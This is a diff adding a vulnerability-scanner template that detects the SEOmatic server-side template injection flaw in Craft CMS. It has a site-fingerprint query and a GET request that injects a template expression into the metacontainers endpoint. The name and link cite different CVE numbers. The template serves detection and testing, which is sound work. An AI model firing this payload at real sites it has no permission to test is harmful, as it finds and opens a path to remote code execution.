@@ -1,0 +1,24 @@
+name: CraftCMS Seomatic RCE CVE-2020-9597
+manual: true
+query: (title=="Welcome to Craft CMS"  | body="href=\"http://craftcms.com/\"" | body="SEOmatic"
+  | header="Craft CMS" | header="Craft CMS, SEOmatic")
+transport: http
+set:
+  r1: randomInt(400000, 448000)
+  r2: randomInt(400000, 448000)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /actions/seomatic/meta-container/meta-link-container/?uri={{5*'5'}}
+    expression: response.status == 200 && response.body.bcontains(b"MetaLinkContainer")
+      && response.body.bcontains(b"canonical") && response.body.bcontains(b"25")
+expression: r0()
+detail:
+  author: aetkrad
+  links:
+  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9757
+  description: The SEOmatic component before 3.3.0 for Craft CMS allows Server-Side
+    Template Injection that leads to RCE via malformed data to the metacontainers
+    controller.
+  tags: rce
